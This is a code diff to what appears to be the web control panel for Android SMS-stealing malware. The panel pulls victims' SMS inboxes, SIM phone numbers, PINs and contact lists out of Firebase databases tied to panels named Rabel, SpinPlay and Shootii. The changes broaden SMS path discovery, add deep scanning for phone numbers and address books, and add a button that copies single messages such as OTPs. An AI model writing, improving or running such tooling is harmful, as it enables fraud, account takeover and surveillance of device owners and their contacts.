@@ -247,9 +247,19 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 .sms-bubble{max-width:92%;padding:12px 14px;border-radius:16px;font-size:13px;line-height:1.45}
 .sms-bubble.in{align-self:flex-start;background:var(--card);border:1px solid var(--border);border-bottom-left-radius:4px}
 .sms-bubble.out{align-self:flex-end;background:rgba(255,60,60,0.15);border:1px solid rgba(255,60,60,0.25);border-bottom-right-radius:4px}
-.sms-from{font-size:10px;font-weight:800;margin-bottom:4px;color:var(--accent2)}
+.sms-from{font-size:10px;font-weight:800;margin-bottom:4px;color:var(--accent2);padding-right:32px}
 .sms-time{font-size:9px;color:var(--muted);margin-top:6px;font-family:'Space Mono',monospace}
 .sms-badge{display:inline-block;font-size:7px;padding:2px 6px;border-radius:6px;background:rgba(255,60,60,0.2);color:var(--accent);margin-left:6px}
+.sms-bubble{position:relative}
+.sms-copy-btn{position:absolute;top:8px;right:8px;width:30px;height:30px;border-radius:8px;border:1px solid var(--border);background:rgba(255,255,255,0.06);color:var(--muted);font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;padding:0;line-height:1}
+.sms-copy-btn:active{transform:scale(0.92)}
+.sms-copy-btn.copied{color:var(--success);border-color:rgba(0,255,157,0.35);background:rgba(0,255,157,0.1)}
+.contacts-card{padding:14px;border-radius:16px;background:var(--card);border:1px solid var(--border);margin-bottom:14px}
+.contacts-hdr{font-size:11px;font-weight:800;color:var(--muted);letter-spacing:1px;margin-bottom:10px}
+.contact-row{display:flex;justify-content:space-between;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.04);font-size:12px}
+.contact-row:last-child{border-bottom:none}
+.contact-name{font-weight:700;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.contact-phone{font-family:'Space Mono',monospace;color:var(--accent2);flex-shrink:0;font-size:11px}
 
 /* SEND FORM */
 .form-card{padding:16px;border-radius:18px;background:var(--card);border:1px solid var(--border)}
@@ -484,7 +494,39 @@ var DEVICE_NODES=['devices','users','clients_list','online_devices','Verify_Devi
 /** Per-device SMS subpaths used by Rabel / SpinPlay / Shootii panels */
 var PANEL_SMS_SUFFIXES=['all_sms','new_sms','sms','messages','sms_inbox','inbox','received_sms','sent_sms','sms_list','user_sms','msg_list'];
 /** Global SMS roots keyed by device id — rebel.py uses messages/{id} */
-var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox'];
+var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox','received_sms','sent_sms','sms_data','device_sms','client_sms','sms_logs','msg_store','text_messages'];
+
+function looksLikePhone(v){
+  if(v==null||v==='')return false;
+  var s=String(v).trim();
+  if(!s||s==='0'||s==='null'||s==='undefined')return false;
+  var digits=s.replace(/\D/g,'');
+  return digits.length>=10&&digits.length<=15;
+}
+function normalizePhoneDigits(v){
+  var d=String(v||'').replace(/\D/g,'');
+  if(d.length>=10)return d.slice(-10);
+  return d;
+}
+function isLikelySmsRootNode(name){
+  if(!name||typeof name!=='string')return false;
+  if(/^(config|settings|admin|rules|metadata|logs|test|passwords|webhook|tokens|auth|version|apk|update|banner|ads|payment|otp)$/i.test(name))return false;
+  return /sms|message|inbox|msg|text|chat|mail|received|sent/i.test(name);
+}
+function buildDynamicSmsPaths(d,inst){
+  var id=d&&d.rawId, paths=[], roots=(inst&&inst.rootKeys)||[], smsRoots=(inst&&inst.smsRootKeys)||[], k;
+  if(!id)return paths;
+  smsRoots.forEach(function(key){if(key)paths.push(key+'/'+id);});
+  roots.forEach(function(key){
+    if(!key||SKIP_NODES.indexOf(key)>=0||isDeviceSummaryNode(key))return;
+    if(isLikelySmsRootNode(key)&&paths.indexOf(key+'/'+id)<0)paths.push(key+'/'+id);
+    PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(key+'/'+id+'/'+sfx);});
+  });
+  return uniqPaths(paths);
+}
+function buildUniversalSmsPaths(d,inst){
+  return uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst)).concat(buildDynamicSmsPaths(d,inst)));
+}
 
 // ---- FIX: Online status accuracy ----
 var ONLINE_FRESH_MS=60000;
@@ -543,7 +585,7 @@ function detectSchemaFromRoots(roots,inst){
   if(roots.Verify_Device||roots.verify_device)return 'shootii';
   if(roots.user_list||roots.user_data||roots.All_Users||roots.All_User)return 'rabel';
   if(roots.messages||roots.clients)return 'rabel';
-  if(roots.devices||roots.devices_status||roots.user_sms)return 'spinplay';
+  if(roots.devices||roots.devices_status||roots.Verify_Device)return 'spinplay';
   var url=(inst&&inst.restUrl)||'';
   if(/rabel|raand|user_list|demon|jdhd|rto9|raki/i.test(url))return 'rabel';
   if(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(url))return 'shootii';
@@ -551,7 +593,7 @@ function detectSchemaFromRoots(roots,inst){
 }
 function getSmsDeviceBases(d,inst){
   var node=(d&&d.deviceNode)||'clients';
-  var bases=[node,'clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','user_sms','online_devices','clients_list'];
+  var bases=[node,'clients','devices','devices_status','Verify_Device','user_list','user_data','users','All_Users','All_User','online_devices','clients_list'];
   if(inst&&inst.config){
     if(inst.config.preferredDeviceNode){
       var pref=inst.config.preferredDeviceNode;
@@ -987,24 +1029,93 @@ function getPhoneFromRecord(s){
   if(!s)return'';
   var check=function(obj){
     if(!obj)return null;
-    var keys=['phone_number','mobNo','phone','number','mobile','phone_no','cell','contact_no','mobile_no','sim_number'];
+    var keys=['phone_number','mobNo','phone','number','mobile','phone_no','cell','contact_no','mobile_no','sim_number','sim1','sim2','sim_1','sim_2','primary_phone','device_phone','user_phone','whatsapp','wa_number','caller_id','msisdn'];
     for(var i=0;i<keys.length;i++){
       if(obj[keys[i]]==null||obj[keys[i]]==='')continue;
       var v=String(obj[keys[i]]).trim();
-      if(v&&v!=='0'&&v!=='null'&&v!=='undefined')return v;
+      if(looksLikePhone(v))return normalizePhoneDigits(v);
     }
     return null;
   };
+  var deepScanPhone=function(obj,depth){
+    if(!obj||typeof obj!=='object'||depth>6)return'';
+    var phoneKey=/phone|mobile|mob|number|sim|cell|contact|whatsapp|wa_no|caller|msisdn/i;
+    var k,v,p,s;
+    for(k in obj){
+      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
+      v=obj[k];
+      if(v==null)continue;
+      if(phoneKey.test(k)&&typeof v!=='object'){
+        if(looksLikePhone(v))return normalizePhoneDigits(v);
+      }
+      if(typeof v==='string'&&looksLikePhone(v)&&phoneKey.test(k))return normalizePhoneDigits(v);
+      if(v&&typeof v==='object'){
+        p=deepScanPhone(v,depth+1);
+        if(p)return p;
+      }
+    }
+    return'';
+  };
   var p=check(s);if(p)return p;
-  if(s.device_info){p=check(s.device_info);if(p)return p;}
-  if(s.live_data){p=check(s.live_data);if(p)return p;}
+  var nests=['device_info','live_data','deviceInfo','liveData','data','info','profile','user','device','sim_info','simInfo','sim_data','SimInfo'];
+  for(var n=0;n<nests.length;n++){if(s[nests[n]]){p=check(s[nests[n]]);if(p)return p;}}
   if(s.Device_info&&typeof s.Device_info==='string'){
     var m=s.Device_info.match(/(?:phone|mobile|number|sim)[^\n:]*[:]\s*([+\d\s-]{8,15})/i);
-    if(m&&m[1])return m[1].replace(/\D/g,'').slice(-10);
+    if(m&&m[1]&&looksLikePhone(m[1]))return normalizePhoneDigits(m[1]);
   }
-  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn)return String(pn).trim();}}
-  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phoneNumber||sim2.number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no;if(pn2)return String(pn2).trim();}}}
-  return '';
+  if(s.sims&&Array.isArray(s.sims)){for(var i=0;i<s.sims.length;i++){var sim=s.sims[i];var pn=sim.phoneNumber||sim.number||sim.phone||sim.mobNo||sim.mobile||sim.contact_no;if(pn&&looksLikePhone(pn))return normalizePhoneDigits(pn);}}
+  if(s.sim_info&&typeof s.sim_info==='object'){var si=s.sim_info;p=check(si);if(p)return p;if(si.sims&&Array.isArray(si.sims)){for(var j=0;j<si.sims.length;j++){var sim2=si.sims[j];var pn2=sim2.phoneNumber||sim2.number||sim2.phone||sim2.mobNo||sim2.mobile||sim2.contact_no;if(pn2&&looksLikePhone(pn2))return normalizePhoneDigits(pn2);}}}
+  return deepScanPhone(s,0);
+}
+function extractContactsFromRecord(raw){
+  if(!raw||typeof raw!=='object')return[];
+  var contacts=[], seen={}, max=80;
+  function addContact(c){
+    if(!c||typeof c!=='object'||contacts.length>=max)return;
+    var name=String(c.name||c.displayName||c.display_name||c.contact_name||c.full_name||c.contactName||'').trim();
+    var phone=String(c.phone||c.phoneNumber||c.phone_number||c.number||c.mobile||c.mobNo||c.contact_no||'').trim();
+    if(!phone&&!name)return;
+    if(phone&&!looksLikePhone(phone))phone='';
+    var key=(name+'|'+phone).toLowerCase();
+    if(seen[key])return;
+    seen[key]=1;
+    contacts.push({name:name||'Unknown',phone:phone?normalizePhoneDigits(phone):''});
+  }
+  function scanContacts(obj,depth){
+    if(!obj||typeof obj!=='object'||depth>5||contacts.length>=max)return;
+    var k,v,i;
+    for(k in obj){
+      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
+      v=obj[k];
+      if(!v)continue;
+      if(/contact|phonebook|addressbook|address_book|phone_book|all_contacts/i.test(k)){
+        if(Array.isArray(v))for(i=0;i<v.length;i++)addContact(v[i]);
+        else if(typeof v==='object'){
+          Object.keys(v).forEach(function(cid){
+            var c=v[cid];
+            if(c&&typeof c==='object')addContact(c);
+            else if(typeof c==='string'&&looksLikePhone(c))addContact({name:cid,phone:c});
+          });
+        }
+      }
+      if(v&&typeof v==='object'&&!Array.isArray(v)){
+        if(v.name||v.displayName||v.phone||v.phoneNumber)addContact(v);
+        else scanContacts(v,depth+1);
+      }
+    }
+  }
+  scanContacts(raw,0);
+  return contacts;
+}
+function mergeContacts(existing,found){
+  var out=(existing||[]).slice(), seen={}, i, c, key;
+  out.forEach(function(x){seen[(x.name+'|'+x.phone).toLowerCase()]=1;});
+  (found||[]).forEach(function(x){
+    key=(x.name+'|'+x.phone).toLowerCase();
+    if(seen[key])return;
+    seen[key]=1;out.push(x);
+  });
+  return out.slice(0,80);
 }
 function isCommandQueueRecord(raw){
   if(!raw||typeof raw!=='object')return false;
@@ -1070,15 +1181,49 @@ function ingestDeviceData(fbId,node,devId,data){
   var key=makeDevKey(fbId,devId), existing=clientsRawMap[key]||{};
   if(!norm.mobNo&&existing.mobNo)norm.mobNo=existing.mobNo;
   if((!norm.name||norm.name==='Unknown')&&existing.name&&existing.name!=='Unknown')norm.name=existing.name;
+  var foundContacts=extractContactsFromRecord(data);
+  if(foundContacts.length)norm.contacts=mergeContacts(existing.contacts,foundContacts);
+  else if(existing.contacts)norm.contacts=existing.contacts;
   if(node==='user_list'||node==='user_data'){
     if(norm.mobNo)norm._phoneSource=node;
     if(node==='user_list')norm._node='user_list';
   }
   clientsRawMap[key]=Object.assign({},existing,norm);
 }
+function enrichFromAllNodes(inst){
+  var roots=uniqPaths((inst.rootKeys||[]).concat(getDeviceNodesForInst(inst))), keys=Object.keys(clientsRawMap), tasks=[], batch=0, maxBatch=36;
+  keys.forEach(function(mapKey){
+    var p=parseDevKey(mapKey);
+    if(p.fbId!==inst.id)return;
+    var rec=clientsRawMap[mapKey];
+    var needsPhone=!rec.mobNo||!String(rec.mobNo).trim();
+    var needsContacts=!rec.contacts||!rec.contacts.length;
+    if(!needsPhone&&!needsContacts)return;
+    roots.forEach(function(node){
+      if(!node||SKIP_NODES.indexOf(node)>=0)return;
+      if(isLikelySmsRootNode(node))return;
+      if(batch>=maxBatch)return;
+      batch++;
+      tasks.push(
+        restJsonInst(inst,node+'/'+p.devId).then(function(data){
+          if(!data||typeof data!=='object'||isFirebaseErr(data))return;
+          var phone=getPhoneFromRecord(data);
+          if(phone&&(!rec.mobNo||!String(rec.mobNo).trim()))rec.mobNo=phone;
+          var contacts=extractContactsFromRecord(data);
+          if(contacts.length)rec.contacts=mergeContacts(rec.contacts,contacts);
+          if(phone||contacts.length)clientsRawMap[mapKey]=rec;
+        }).catch(function(){})
+      );
+    });
+  });
+  if(!tasks.length)return Promise.resolve();
+  return Promise.all(tasks).then(function(){processClientsData();});
+}
 function enrichFromUserList(inst){
   return fetchSummaryNode(inst,'user_list').then(function(){
     return fetchSummaryNode(inst,'user_data').catch(function(){return null;});
+  }).then(function(){
+    return enrichFromAllNodes(inst);
   }).then(function(){
     processClientsData();
   });
@@ -1096,10 +1241,12 @@ function processClientsDataNow(){
   Object.keys(clientsRawMap).forEach(function(k){
     var s=clientsRawMap[k],p=parseDevKey(k),inst=getFbInstance(p.fbId);
     var on=resolveOnlineStatus(s,p.fbId);
+    var contacts=s.contacts||extractContactsFromRecord(s);
     allDevs.push({id:k,rawId:p.devId,fbId:p.fbId,fbName:inst?inst.name:p.fbId,deviceNode:s._node||'user_list',
       name:s.name||'Unknown',displayPhone:(s.mobNo||getPhoneFromRecord(s)||'').trim()||'No Number',brand:s.brand||'',android:s.android||'',
       status:on?'online':'offline',battery:s.battery||0,network:s.network||'?',smsCount:s.sms_count||0,
-      sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s)});
+      sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s),
+      contacts:contacts,contactCount:contacts.length});
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
   ensureActiveFbValid();
@@ -1128,27 +1275,29 @@ function bruteFetchDeviceNodes(inst){
 }
 function discoverInstance(inst){
   return restJsonInstShallow(inst).then(function(roots){
-    if(!roots||typeof roots!=='object'||isFirebaseErr(roots)){
-      return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);});
+    if(roots&&typeof roots==='object'&&!isFirebaseErr(roots)){
+      inst.rootKeys=Object.keys(roots);
+      inst.smsRootKeys=inst.rootKeys.filter(isLikelySmsRootNode);
+      inst.schema=detectSchemaFromRoots(roots,inst);
+      if(inst.config){
+        inst.config.schema=inst.schema;
+        if(roots.user_list)inst.config.preferredDeviceNode='user_list';
+        else if(roots.user_data&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='user_data';
+      }
+      var nodes=Object.keys(roots).filter(function(n){return isDeviceSummaryNode(n);});
+      if(roots.user_list&&nodes.indexOf('user_list')<0)nodes.unshift('user_list');
+      if(roots.user_data&&nodes.indexOf('user_data')<0)nodes.unshift('user_data');
+      if(!nodes.length)nodes=getDeviceNodesForInst(inst);
+      var tasks=[];
+      nodes.forEach(function(n){
+        tasks.push(fetchSummaryNode(inst,n));
+      });
+      return Promise.all(tasks).then(function(){
+        if(!allDevs.length) return bruteFetchDeviceNodes(inst);
+        return enrichFromUserList(inst);
+      });
     }
-    inst.schema=detectSchemaFromRoots(roots,inst);
-    if(inst.config){
-      inst.config.schema=inst.schema;
-      if(roots.user_list)inst.config.preferredDeviceNode='user_list';
-      else if(roots.user_data&&!inst.config.preferredDeviceNode)inst.config.preferredDeviceNode='user_data';
-    }
-    var nodes=Object.keys(roots).filter(function(n){return isDeviceSummaryNode(n);});
-    if(roots.user_list&&nodes.indexOf('user_list')<0)nodes.unshift('user_list');
-    if(roots.user_data&&nodes.indexOf('user_data')<0)nodes.unshift('user_data');
-    if(!nodes.length)nodes=getDeviceNodesForInst(inst);
-    var tasks=[];
-    nodes.forEach(function(n){
-      tasks.push(fetchSummaryNode(inst,n));
-    });
-    return Promise.all(tasks).then(function(){
-      if(!allDevs.length) return bruteFetchDeviceNodes(inst);
-      return enrichFromUserList(inst);
-    });
+    return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);});
   }).catch(function(){
     return bruteFetchDeviceNodes(inst).then(function(){return enrichFromUserList(inst);});
   });
@@ -1235,6 +1384,14 @@ function renderDeviceView(){
   var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
   if(!d){empty.classList.remove('hidden');hero.classList.add('hidden');return;}
   empty.classList.add('hidden');hero.classList.remove('hidden');
+  var contacts=(d.contacts||[]).slice(0,12);
+  var contactsHtml='';
+  if(contacts.length){
+    contactsHtml='<div class="contacts-card"><div class="contacts-hdr">CONTACTS · '+contacts.length+(d.contactCount>contacts.length?'+'+(d.contactCount-contacts.length):'')+'</div>'+
+      contacts.map(function(c){
+        return '<div class="contact-row"><div class="contact-name">'+esc(c.name)+'</div><div class="contact-phone">'+esc(c.phone||'—')+'</div></div>';
+      }).join('')+'</div>';
+  }
   hero.innerHTML='<div class="hero-card">'+
     '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
     '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+' · <span class="chip fb">'+esc(d.fbName)+'</span></div>'+
@@ -1244,7 +1401,7 @@ function renderDeviceView(){
     '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
     '<div class="hero-cell"><div class="hero-lbl">SMS</div><div class="hero-val">'+d.smsCount+'</div></div>'+
-    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
+    '</div><div style="margin-top:12px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>'+contactsHtml;
 }
 function extractDeviceSims(raw){
   var sims=[],seen={},i,s,pn;
@@ -1367,9 +1524,16 @@ function smsPrimaryPaths(d,inst){
     paths.push('user_sms/'+id);
     paths.push('messages/'+id);
     paths.push('sms/'+id);
-  }else{
-    PANEL_SMS_GLOBAL_NODES.forEach(function(g){paths.push(g+'/'+id);});
+    bases.forEach(function(n){
+      if(!n)return;
+      ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
+        var p=n+'/'+id+'/'+sfx;
+        if(paths.indexOf(p)<0)paths.push(p);
+      });
+    });
+    return uniqPaths(paths);
   }
+  PANEL_SMS_GLOBAL_NODES.forEach(function(g){paths.push(g+'/'+id);});
   if(schema==='shootii'){
     ['Verify_Device'].concat(bases).forEach(function(n){
       if(!n)return;
@@ -1415,7 +1579,7 @@ function smsPathsForDevice(d,inst){
     PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(n+'/'+id+'/'+sfx);});
     paths.push(n+'/'+id+'/webhookEvent/receivedSms');
   });
-  return uniqPaths(paths);
+  return uniqPaths(paths.concat(buildDynamicSmsPaths(d,inst||getFbInstance(d.fbId))));
 }
 
 function mergeSmsLists(){
@@ -1440,7 +1604,7 @@ function parseSmsRaw(data){
 
 function fetchSmsFast(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var paths=smsPrimaryPaths(d,inst), i=0;
+  var paths=buildUniversalSmsPaths(d,inst), i=0;
   function tryNext(){
     if(i>=paths.length)return Promise.resolve([]);
     var p=paths[i++];
@@ -1455,8 +1619,8 @@ function fetchSmsFast(inst,d){
 
 function fetchSmsFromPathsDirect(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var paths=smsPathsForDevice(d,inst);
-  return Promise.all(paths.map(function(p){
+  var paths=buildUniversalSmsPaths(d,inst);
+  return Promise.all(paths.slice(0,28).map(function(p){
     return restJsonInst(inst,p).then(function(data){
       if(!data||isFirebaseErr(data))return [];
       return smsAsList(data).map(normalizeSms).filter(Boolean);
@@ -1521,7 +1685,7 @@ function loadSmsForDevice(force){
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq};
 
   if(inst.db){
-    uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst))).slice(0,10).forEach(function(path){
+    buildUniversalSmsPaths(d,inst).slice(0,14).forEach(function(path){
       if(!path)return;
       try{
         var ref=inst.db.ref(path);
@@ -1619,12 +1783,38 @@ function renderSms(){
   var list=(cached&&cached.list&&cached.list.length)?cached.list:(selDev===d.id?window_sms:[]);
   if(_smsLoading&&!list.length){el.innerHTML='<div class="empty-state"><div class="ico">⏳</div>Loading SMS...</div>';return;}
   if(!list.length){el.innerHTML='<div class="empty-state"><div class="ico">📭</div>No SMS on this device</div>';return;}
-  el.innerHTML=list.slice(0,80).map(function(s){
+  el.innerHTML=list.slice(0,80).map(function(s,idx){
     var out=s.type==='sent'||s.type==='outbox';
     return '<div class="sms-bubble '+(out?'out':'in')+'">'+
+      '<button type="button" class="sms-copy-btn" onclick="copySmsByIndex('+idx+')" title="Copy SMS">📋</button>'+
       '<div class="sms-from">'+esc(s.address)+(out?'':'')+'</div>'+
       esc(s.body)+'<div class="sms-time">'+esc(s.date_readable)+'</div></div>';
   }).join('');
+}
+function copySmsByIndex(idx){
+  var d=getSelDev();if(!d)return;
+  var cached=deviceSmsCache[d.id];
+  var list=(cached&&cached.list&&cached.list.length)?cached.list:window_sms;
+  var s=list&&list[idx];if(!s||!s.body)return;
+  var text=String(s.body);
+  function markCopied(btn){
+    if(!btn)return;
+    btn.textContent='✓';btn.classList.add('copied');
+    toast('SMS copied',true);
+    setTimeout(function(){btn.textContent='📋';btn.classList.remove('copied');},1500);
+  }
+  var btn=document.querySelectorAll('.sms-copy-btn')[idx];
+  if(navigator.clipboard&&navigator.clipboard.writeText){
+    navigator.clipboard.writeText(text).then(function(){markCopied(btn);}).catch(function(){
+      var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
+      try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
+      document.body.removeChild(ta);
+    });
+  }else{
+    var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
+    document.body.removeChild(ta);
+  }
 }
 
 // ---- FIX: SIM Selection ----
